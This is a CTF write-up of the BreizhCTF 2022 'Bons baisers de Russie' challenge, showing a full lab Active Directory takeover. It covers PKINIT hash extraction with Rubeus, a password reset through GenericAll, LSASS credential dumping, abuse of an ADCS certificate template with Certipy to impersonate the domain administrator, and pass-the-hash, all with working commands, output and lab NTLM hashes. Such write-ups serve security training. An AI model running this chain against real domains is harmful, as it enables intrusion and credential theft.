---
title: BreizhCTF 2022 - Bon baisers de Russie 1 & 2
authors: QuentynLemaire,Crypt0-M3lon
layout: writeup
ctf_url: https://www.breizhctf.com/
---
Category: AD, Pentest

## Challenge description

### Bons baisers de Russie 1/2: 

Le site de vente de tongues était la façade d'un groupe d'APT permettant de fournir les accès VPN à ses utilisateurs ! Utilisez cet accès VPN afin de compromettre, dans un premier temps, le PC ! La donnée à récupérer est sur le bureau d'un des utilisateurs...


### Bons baisers de Russie : 2/2

Avec les accès obtenus sur le PC, vous devriez pouvoir compromettre le contrôleur de domaine ! Récuperez la donnée sur le bureau de l'administrateur du domaine !

Auteur: Kaluche

Note : Le range à attaquer une fois connecté au VPN est 10.0.20.0/24

Format: BZHCTF{}

## Challenge resolution

### TL;DR

All the difficulty stands in the poor compatibility of tools with unicode characters, the attack path is pretty simple:

1. Port scan, identify a web server on the domain controller serving 3 PFX without password
2. Use PKINIT authentication and UnPAC-the-hash to retrieve NTLM hashes (Rubeus)
3. Use BloodHound.py with previously retrieved hashes and identify an attack path to the PC1
4. Use Валерий account to reset ЗИНАИДА password and connect to PC1 as admin and get first flag
5. Dump PC1 lsass memory and get Дарья account password
6. Use Certipy to enumerate ADCS template and identify that Professor account (Дарья) is allowed to emit certificate with arbitrary SAN
7. Request a PFX for the Administrator user (администратор in cyrillic) and replay step 2 to get his hash
8. Pass the hash to access DC1 and get second flag

### First part

Once connected on the VPN, we scan the target range `10.0.20.0/24` as stated in the challenge description. Here is the nmap result:

```
Nmap scan report for 10.0.20.11
Host is up (0.0098s latency).
Not shown: 986 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title:         Important information for CONTI USERS    
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-04-01 21:18:42Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: CONTI.RU0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC1.CONTI.RU
| Subject Alternative Name: othername:<unsupported>, DNS:DC1.CONTI.RU
| Issuer: commonName=CONTI-DC1-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-03-25T13:39:16
| Not valid after:  2023-03-25T13:39:16
| MD5:   9f7a 5b87 8195 0974 c23e b834 b0c1 c683
|_SHA-1: cb33 3e80 a78e 389c fa3d beb9 4642 34c9 f5b9 87ce
|_ssl-date: 2022-04-01T21:20:20+00:00; -1h00m03s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: CONTI.RU0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC1.CONTI.RU
| Subject Alternative Name: othername:<unsupported>, DNS:DC1.CONTI.RU
| Issuer: commonName=CONTI-DC1-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-03-25T13:39:16
| Not valid after:  2023-03-25T13:39:16
| MD5:   9f7a 5b87 8195 0974 c23e b834 b0c1 c683
|_SHA-1: cb33 3e80 a78e 389c fa3d beb9 4642 34c9 f5b9 87ce
|_ssl-date: 2022-04-01T21:20:20+00:00; -1h00m03s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: CONTI.RU0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC1.CONTI.RU
| Subject Alternative Name: othername:<unsupported>, DNS:DC1.CONTI.RU
| Issuer: commonName=CONTI-DC1-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-03-25T13:39:16
| Not valid after:  2023-03-25T13:39:16
| MD5:   9f7a 5b87 8195 0974 c23e b834 b0c1 c683
|_SHA-1: cb33 3e80 a78e 389c fa3d beb9 4642 34c9 f5b9 87ce
|_ssl-date: 2022-04-01T21:20:20+00:00; -1h00m03s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: CONTI.RU0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC1.CONTI.RU
| Subject Alternative Name: othername:<unsupported>, DNS:DC1.CONTI.RU
| Issuer: commonName=CONTI-DC1-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-03-25T13:39:16
| Not valid after:  2023-03-25T13:39:16
| MD5:   9f7a 5b87 8195 0974 c23e b834 b0c1 c683
|_SHA-1: cb33 3e80 a78e 389c fa3d beb9 4642 34c9 f5b9 87ce
|_ssl-date: 2022-04-01T21:20:20+00:00; -1h00m03s from scanner time.
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC1.CONTI.RU
| Issuer: commonName=DC1.CONTI.RU
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-03-24T10:22:49
| Not valid after:  2022-09-23T10:22:49
| MD5:   f601 2ff9 783f e954 87f2 f1d9 639a 5941
|_SHA-1: 3eed 7641 f9f3 9b04 b4d5 ec21 0722 4125 d8cf e778
|_ssl-date: 2022-04-01T21:20:20+00:00; -1h00m03s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: CONTI
|   NetBIOS_Domain_Name: CONTI
|   NetBIOS_Computer_Name: DC1
|   DNS_Domain_Name: CONTI.RU
|   DNS_Computer_Name: DC1.CONTI.RU
|   DNS_Tree_Name: CONTI.RU
|   Product_Version: 10.0.20348
|_  System_Time: 2022-04-01T21:19:41+00:00
5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): FreeBSD 6.X (86%)
OS CPE: cpe:/o:freebsd:freebsd:6.2
Aggressive OS guesses: FreeBSD 6.2-RELEASE (86%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 0.403 days (since Fri Apr  1 14:40:44 2022)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1h00m02s, deviation: 0s, median: -1h00m03s
| smb2-time: 
|   date: 2022-04-01T21:19:44
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
-   Hop 1 is the same as for 10.0.20.19
2   41.05 ms 10.0.20.11

Nmap scan report for 10.0.20.19
Host is up (0.0020s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2022-04-01T21:20:20+00:00; -1h00m03s from scanner time.
| ssl-cert: Subject: commonName=PC1.CONTI.RU
| Issuer: commonName=PC1.CONTI.RU
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-03-26T16:00:19
| Not valid after:  2022-09-25T16:00:19
| MD5:   aa4f 137c d2fc c497 c42c 76c0 aad1 51fa
|_SHA-1: 5629 08aa d587 d041 6fe8 d23a ba75 4ec9 488c 278a
| rdp-ntlm-info: 
|   Target_Name: CONTI
|   NetBIOS_Domain_Name: CONTI
|   NetBIOS_Computer_Name: PC1
|   DNS_Domain_Name: CONTI.RU
|   DNS_Computer_Name: PC1.CONTI.RU
|   DNS_Tree_Name: CONTI.RU
|   Product_Version: 10.0.19041
|_  System_Time: 2022-04-01T21:19:41+00:00
5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=4/2%OT=135%CT=1%CU=43721%PV=Y%DS=2%DC=T%G=Y%TM=62477AA
OS:7%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=109%TI=I%CI=I%TS=U)OPS(O1=M
OS:54CNW8NNS%O2=M54CNW8NNS%O3=M54CNW8%O4=M54CNW8NNS%O5=M54CNW8NNS%O6=M54CNN
OS:S)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80%
OS:W=FFFF%O=M54CNW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=
OS:N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=
OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T
OS:7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE
OS:(R=N)
```

We have 2 computers within the same Active Directory domain `CONTI.RU`:
    
- a domain controller `DC1.CONTI.RU` at **10.0.20.11** with the ADCS role enabled
- a joined computer `PC1.CONTI.RU` at **10.0.20.19**

By heading towards the domain controller web site on port TCP/80, it is possible to download 3 unprotected PFX for 3 different users:
- `Наистина`
- `Вячеслав`
- `Валерий`

These PFX files contains the certificate with the associated private keys required to authenticate on behalf of those users on the domain `CONTI.RU`.

We tried to use Dirkjanm PKINITTools (https://github.com/dirkjanm/PKINITtools) to get a TGT via PKINIT, but the tool failed to handle unicode characters correctly.

The first step is to get the Alternate Name from the certificates:
![PFX details](/assets/breizhctf-22-pfx-details.png)

Next, using `Rubeus` `asktgt` command we can retrieve a TGT and fetch the NTLM hashes of the 3 accounts with `/getcredentials`. Note that PowerShell replace unicode characters by `??????` but it works like a charm:

```
PS C:\Users\user\Downloads> ./Rubeus.exe asktgt /user:????????????? /certificate:?????????????.pfx /domain:conti.ru /dc:10.0.20.11 /createnetonly:C:\Windows\System32\cmd.exe /getcredentials
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/  v2.0.2
[*] Action: Ask TGT
[*] Showing process : False
[*] Username        : AL9SDSYT
[*] Domain          : EDDZ0POS
[*] Password        : WKQYD994
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 4944
[+] LUID            : 0x33dbab[*] Using PKINIT with etype rc4_hmac and subject: CN=?????
[*] Building AS-REQ (w/ PKINIT preauth) for: 'conti.ru\?????????????'
[*] Target LUID : 3398571
[*] Using domain controller: 10.0.20.11:88
[X] KRB-ERROR (37) : KRB_AP_ERR_SKEWPS 
```
The error `KRB_AP_ERR_SKEWPS` indicates that we have a time drift with the DC, we need to change time of our client to comply with the server. Fortunatly, the domain controller indicates its time in the Kerberos exchange:

![Kerberos SKEW](/assets/breizhctf-22-kerberos-skew.png)

Let's try again with clock alligned:
```
C:\Users\user\Downloads> ./Rubeus.exe asktgt /user:???????? /certificate:????????.pfx /domain:conti.ru /dc:10.0.20.11 /createnetonly:C:\Windows\System32\cmd.exe  /getcredentials
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/  v2.0.2
[*] Action: Ask TGT
[*] Showing process : False
[*] Username        : 8C6NPBIX
[*] Domain          : T78KN4RS
[*] Password        : KTK21ESA
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 5128
[+] LUID            : 0x343283
[*] Using PKINIT with etype rc4_hmac and subject: CN=?????
[*] Building AS-REQ (w/ PKINIT preauth) for: 'conti.ru\????????'
[*] Target LUID : 3420803
[*] Using domain controller: 10.0.20.11:88
[+] TGT request successful!
[*] base64(ticket.kirbi):
      doIGTjCCBkqgAwIBBaEDAgEWooIFXTCCBVlhggVVMIIFUaADAgEFoQobCENPTlRJLlJVoh0wG6ADAgEC
      oRQwEhsGa3JidGd0Gwhjb250aS5ydaOCBR0wggUZoAMCARKhAwIBAqKCBQsEggUHRzsczbSM/Q4KLi0/
      3EGc3dTPdCJkND8ThMqGyvrQ9qQTLVNcCMqvs+hqIwxkrR7piDwJYHknzF25WtLWdcpErbsLOzze1lKK
      kPgHsextNyVOQHKhO1+Sm4Ry1u0Aa619rMfU4I/UQ3uplGcals34BnKtx0mVULJZokoAeWG7TsxZwQeL
      +oWW03xl718h095MCnamgIE0UigHg1iUz2/Md6b2cNuypCytPdo2Cr+iuO4SB53RxPapTxni9624qYyx
      GjHlOVegOaQPntNYZfvmvl1v015fLiNsU5ss/DyaLF5K1Xo1Qkz3eoA26YsaTGpg9wGuW5wEWHmjq6Er
      h/IpUmea0hRqPR0yKcYDeVa4YsNo7Fc2G5JuBtX5MjSV6f6dQ0PcSni6mFcxT3H/Gi91q7I1gK7Nl4kw
      [...]
      Akcg3UyFBaoaYessGLmwqEnyNe7UeAQdmB0LKiwSlL6WqTxgbyM0MiLE5lk2biEuW6uz4dl3lQ7nWmqy
      KrhgdxNTCZXekQeRlhrzctYyjFfo20NYTYDzCnIuCHahdkVpVrCqBTKswU9QKjiOScGApEdgoPIUUtc3
      FEV3wVJL7Nv0iKMtDgz7MVGh/eoq4ObBo6Z/cxY0xZMTz0bzTErSVI3CcwaxkGzktBRKWj4YSKqCl/sG
      DFA9CUngRPD+etUaE2JiqHS/CgTRaworwLPAcHyOMbY7Q/kTzRjBvrF6nF9a6IzAnl0JIbryI34TWrX7
      C9DW9Go6RniORoq6R4Lko4HcMIHZoAMCAQCigdEEgc59gcswgciggcUwgcIwgb+gGzAZoAMCARehEgQQ
      LfNiidKACxOqykFrOkoURKEKGwhDT05USS5SVaInMCWgAwIBAaEeMBwbGtCQ0JTQnNCY0J3QmNCh0KLQ
      oNCQ0KLQntCgowcDBQBA4QAApREYDzIwMjIwNDAyMDIwNjQ4WqYRGA8yMDIyMDQwMjEyMDY0OFqnERgP
      MjAyMjA0MDkwMjA2NDhaqAobCENPTlRJLlJVqR0wG6ADAgECoRQwEhsGa3JidGd0Gwhjb250aS5ydQ==
[*] Target LUID: 0x343283
[+] Ticket successfully imported!  ServiceName              :  krbtgt/conti.ru
  ServiceRealm             :  CONTI.RU
  UserName                 :  ????????
  UserRealm                :  CONTI.RU
  StartTime                :  02/04/2022 02:06:48
  EndTime                  :  02/04/2022 12:06:48
  RenewTill                :  09/04/2022 02:06:48
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  LfNiidKACxOqykFrOkoURA==
  ASREP (key)              :  25975C2EA613F124361E4B6BD72D644B
[*] Getting credentials using U2U  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : EE91709B90200C5685533AB93888CCCD
```

It works! We are able to retrieve 3 NTLM hashes for 3 users in `CONTI.RU` domain:

| User reference | SamAccountName | NTLM                             |
|----------------|----------------|----------------------------------|
| A              | Наистина       | EE91709B90200C5685533AB93888CCCD |
| B              | Вячеслав       | 78DD51AEF64338AD248FF80B25849C44 |
| C              | Валерий        | BE5C60EC1E9ED48B1ACB5C87D555C6E2 |

We can now gather information on the domain via different tools (smbclient, rpcclient, cme, ...) and perform a BloodHound.py collection to search for privilege escalation paths.

User enumeration with user C:
```
$ crackmapexec smb 10.0.20.11 -u Валерий -H 'BE5C60EC1E9ED48B1ACB5C87D555C6E2' --users 
CONTI.RU\Администратор                  Встроенная учетная запись администратора компьютера/домена
CONTI.RU\Гость                          Встроенная учетная запись для доступа гостей к компьютеру или домену
CONTI.RU\krbtgt                         Учетная запись службы KDC
CONTI.RU\Алексей                        HR
CONTI.RU\Альберт                        Negotiates ransom with companies, creates darknet blogs
CONTI.RU\Анна                           works on cryptolocker, decrypts data for victims
CONTI.RU\Артур                          Boss 2
CONTI.RU\Вадим                          Negotiates ransom with companies, creates darknet blogs
CONTI.RU\Валерий                        top hacker
CONTI.RU\Виктор                         sysadmin, oversees botnets
CONTI.RU\Виолетта                       works on cryptolocker, decrypts data for victims
CONTI.RU\Вячеслав                       Hacker, works as intermediary between the group and the victims
CONTI.RU\Галрй                          HR / Legal
CONTI.RU\Григорий                       Sysadmin
CONTI.RU\Дарья                          Negotiates ransom with companies, creates darknet blogs
CONTI.RU\Денис                          Hacker, manager
CONTI.RU\Елизавета                      works on cryptolocker, decrypts data for victims
CONTI.RU\Зинаида                        Sysadmin
CONTI.RU\Илья                           works on cryptolocker, decrypts data for victims
CONTI.RU\Карина                         HR
CONTI.RU\Клавдия                        sysadmin, oversees botnets
CONTI.RU\Кльия                          technical manager, QA, side projects (blockhain, hackers' social network)
CONTI.RU\Кристина                       Alla Witte, the Trickbot developer
CONTI.RU\Ксения                         HR
CONTI.RU\Лариса                         Sysadmin
CONTI.RU\Наистина                       hacker
CONTI.RU\Наталья                        Boss 1
CONTI.RU\Пётр                           HR
CONTI.RU\Федор                          Developer
CONTI.RU\Феттаерт                       HR
CONTI.RU\Ярослав                        Developers' teamlead / OSINT research
```

Bloodhound.py (https://github.com/fox-it/BloodHound.py) execution with user C:
```
$ python bloodhound.py -u Валерий --hashes 00000000000000000000000000000000:BE5C60EC1E9ED48B1ACB5C87D555C6E2 -d CONTI.RU -dc DC1.CONTI.RU -ns 10.0.20.11 -c All
```

A path from the owned user ВАЛЕРИЙ (user C) to ЗИНАИДА (let's call him user D), a local admin of `PC1.CONTI.RU` stands out. Indeed, user C has a `GenericAll` permission on user D, which allows password reset:
![BloodHound attack path](/assets/breizhctf-22-bloodhound-path.png)

We perform the password reset via `pth-rpcclient` and `setuserinfo2` RPC call:
```
$ pth-rpcclient -U CONTI.RU/Валерий%00000000000000000000000000000000:BE5C60EC1E9ED48B1ACB5C87D555C6E2 //10.0.20.11

rpcclient $> setuserinfo2 ЗИНАИДА 23 'TipiHackWasH3re'
E_md4hash wrapper called.
E_deshash wrapper called.
```

From this point, we can connect to `PC1.CONTI.RU` with `ЗИНАИДА` and get the first flag on the desktop:
![SMBClient first flag](/assets/breizhctf-22-first-flag.png)

### Second part

We are local administrator of `PC1.CONTI.RU`, we now want to get domain administrator privileges. We execute post-exploitation tools on `PC1.CONTI.RU` to gather more information: dump lsass memory with procdump, SAM dump, LSA secrets, DPAPI, etc.

From LSASS memory dump, we can collect the credentials of the user `CONTI.RU\Дарья` (user E):
```
Authentication Id : 0 ; 337548 (00000000:0005268c)
Session           : Interactive from 1
User Name         : Дарья
Domain            : CONTI
Logon Server      : DC1
Logon Time        : 01/04/2022 11:41:16
SID               : S-1-5-21-2511036384-2806266831-3360082211-1122
        msv :
         [00000003] Primary
         * Username : Дарья
         * Domain   : CONTI
         * NTLM     : 7a0f1f2a2b2a749312b97777b61cd6a5
         * SHA1     : 8007e878e7cd47f7c28d7692c7ca244e0fca07ba
         * DPAPI    : bafcaae286442922333bd3d1b6e3bbe5
        tspkg :
        wdigest :
         * Username : Дарья
         * Domain   : CONTI
         * Password : (null)
        kerberos :
         * Username : Дарья
         * Domain   : CONTI.RU
         * Password : (null)
        ssp :
        credman :
        cloudap :       KO
```

From the BloodHound point of view, this user does not have any interesting privileges, nor any privileges on the `PC1.CONTI.RU` computer.

We have to find another way to escalate privileges. At the beginning of the challenge, we had to play with PKINIT and PFX. Our nmap scan reveals that there is an ADCS role installed on the domain controller and we didn't look at it yet. Time for ADCS information gathering!

We use Certipy (https://github.com/ly4k/Certipy) excellent tool to enumerate ADCS objects and permissions:
```
$ certipy find -hashes "00000000000000000000000000000000:7a0f1f2a2b2a749312b97777b61cd6a5" 'CONTI.RU/Дарья@10.0.20.11'
Certipy v2.0.9 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Trying to get CA configuration for 'CONTI-DC1-CA' via CSRA
[!] Got error while trying to get CA configuration for 'CONTI-DC1-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'CONTI-DC1-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'CONTI-DC1-CA'
[*] Found 12 enabled certificate templates
[*] Saved text output to '20220401225602_Certipy.txt'
[*] Saved JSON output to '20220401225602_Certipy.json'
[*] Saved BloodHound data to '20220401225602_Certipy.zip'. Drag and drop the file into the BloodHound GUI
```

User E (RID = 1122 on the domain) found on PC1.CONTI.RU workstation can use the template `UserAfterLeak` to generate certificates (`Enroll` privilege) signed by the `CONTI-DC1-CA` certificate authority. The template has the properties we want to escalate privileges:

- **Client Authentication** so that we can generate certificate to authenticate users
- **EnrolleeSuppliesSubject** so that we can choose arbitrary Subjet Alternative Name (SAN)
- Does not require manager approval

```json
{
  "Properties": {
      "highvalue": true,
      "name": "USERAFTERLEAK@CONTI.RU",
      "Template Name": "UserAfterLeak",
      "Display Name": null,
      "Certificate Authorities": [
          "CONTI-DC1-CA"
      ],
      "Enabled": true,
      "Client Authentication": true,
      "Enrollee Supplies Subject": true,
      "Certificate Name Flag": [
          "EnrolleeSuppliesSubject" // <== can specify arbitrary SAN
      ],
      "Enrollment Flag": [
          "PublishToDs",
          "IncludeSymmetricAlgorithms"
      ],
      "Extended Key Usage": [
          "Client Authentication", // <== important property to authenticate user with the generated certificates
          "Secure Email",
          "Encrypting File System"
      ],
      "Requires Manager Approval": false, // no approval required
      "Application Policies": [],
      "Authorized Signatures Required": 0,
      "Validity Period": "1 year",
      "Renewal Period": "6 weeks",
      "domain": "CONTI.RU",
      "type": "Certificate Template"
  },
  "ObjectIdentifier": "e22fc4ca-c0b3-4aa9-9413-79a0cece8f58",
  "Aces": [
      {
          "PrincipalSID": "S-1-5-21-2511036384-2806266831-3360082211-500",
          "PrincipalType": "User",
          "RightName": "Owner",
          "IsInherited": false
      },
      {
          "PrincipalSID": "S-1-5-21-2511036384-2806266831-3360082211-1122", // <== USER D we own
          "PrincipalType": "User",
          "RightName": "Enroll",
          "IsInherited": false
      },
[...]
```

With this information, we can generate PFX for any users, so we choose the built-in domain administrator: `АДМИНИСТРАТОР@CONTI.RU`:

```bash
$ certipy req -hashes "00000000000000000000000000000000:7a0f1f2a2b2a749312b97777b61cd6a5" 'CONTI.RU/Дарья@10.0.20.11' -ca 'CONTI-DC1-CA' -template 'UserAfterLeak' -alt 'АДМИНИСТРАТОР@CONTI.RU'
Certipy v2.0.9 - by Oliver Lyak (ly4k)

[*] Requesting certificate
[*] Successfully requested certificate
[*] Request ID is 21
[*] Got certificate with UPN 'АДМИНИСТРАТОР@CONTI.RU'
[*] Saved certificate and private key to 'администратор.pfx'
```

Fire Rubeus to get the user NTLM hash:
```
PS C:\Users\user\Downloads> ./Rubeus.exe asktgt /user:????????????? /certificate:?????????????.pfx /domain:conti.ru /dc:10.0.20.11 /createnetonly:C:\Windows\System32\cmd.exe  /getcredentials
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/
  v2.0.2
[*] Action: Ask TGT
[*] Showing process : False
[*] Username        : 8C6NPBIX
[*] Domain          : T78KN4RS
[*] Password        : KTK21ESA
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 5128
[+] LUID            : 0x343283
[*] Using PKINIT with etype rc4_hmac and subject: CN=?????
[*] Building AS-REQ (w/ PKINIT preauth) for: 'conti.ru\?????????????'
[*] Target LUID : 3420803
[*] Using domain controller: 10.0.20.11:88
[+] TGT request successful!
[*] base64(ticket.kirbi):
      doIGTjCCBkqgAwIBBaEDAgEWooIFXTCCBVlhggVVMIIFUaADAgEFoQobCENPTlRJLlJVoh0wG6ADAgEC
      oRQwEhsGa3JidGd0Gwhjb250aS5ydaOCBR0wggUZoAMCARKhAwIBAqKCBQsEggUHRzsczbSM/Q4KLi0/
      3EGc3dTPdCJkND8ThMqGyvrQ9qQTLVNcCMqvs+hqIwxkrR7piDwJYHknzF25WtLWdcpErbsLOzze1lKK
      [...]
      LfNiidKACxOqykFrOkoURKEKGwhDT05USS5SVaInMCWgAwIBAaEeMBwbGtCQ0JTQnNCY0J3QmNCh0KLQ
      oNCQ0KLQntCgowcDBQBA4QAApREYDzIwMjIwNDAyMDIwNjQ4WqYRGA8yMDIyMDQwMjEyMDY0OFqnERgP
      MjAyMjA0MDkwMjA2NDhaqAobCENPTlRJLlJVqR0wG6ADAgECoRQwEhsGa3JidGd0Gwhjb250aS5ydQ==
[*] Target LUID: 0x343283
[+] Ticket successfully imported!
  ServiceName              :  krbtgt/conti.ru
  ServiceRealm             :  CONTI.RU
  UserName                 :  ?????????????
  UserRealm                :  CONTI.RU
  StartTime                :  02/04/2022 02:06:48
  EndTime                  :  02/04/2022 12:06:48
  RenewTill                :  09/04/2022 02:06:48
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  LfNiidKACxOqykFrOkoURA==
  ASREP (key)              :  25975C2EA613F124361E4B6BD72D644B
[*] Getting credentials using U2U
  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : C9876588D1B9FBACAA9A6F8D5642BFA8
```

With the administrator NTLM hash, we can connect to the domain controller and grab the second flag:
```
$ smbclient //10.0.20.11/C$ -U администратор --pw-nt-hash C9876588D1B9FBACAA9A6F8D5642BFA8 -W CONTI.RU
smb: \> cd Users\администратор\Desktop\
smb: \Users\администратор\Desktop\> ls
  .                                  DR        0  Fri Mar 25 09:52:00 2022
  ..                                  D        0  Fri Apr  1 04:26:29 2022
  desktop.ini                       AHS      282  Fri Mar 25 04:06:13 2022
  flag.txt                            A       37  Fri Mar 25 09:53:05 2022

                26042623 blocks of size 4096. 22040327 blocks available
smb: \Users\администратор\Desktop\> get flag.txt 
getting file \Users\администратор\Desktop\flag.txt of size 37 as flag.txt (0.6 KiloBytes/sec) (average 0.6 KiloBytes/sec)
smb: \Users\администратор\Desktop\> ^C
```

And finally, get the second flag:
```
$ cat flag.txt
BZHCTF{pwning_ru_domain_is_fun_no?}
```

### Final thoughs

The challenge was not difficult from an Active Directory perspective. However, dealing with cyrillic characters was harden than we though because many tools don't support unicode correctly. We had to alternate Linux and Windows tools to made it.

For instance, when passing the hash with Mimikatz the user name is replaced with litteral `?` during NTLM authentication. On the other side Sharpkatz seemed to work fine, but we had so mess up with lsass memory that nothing was working fine in the VM... On the other side, all linux tools seemed to accept unicode character, expect PKINITTools.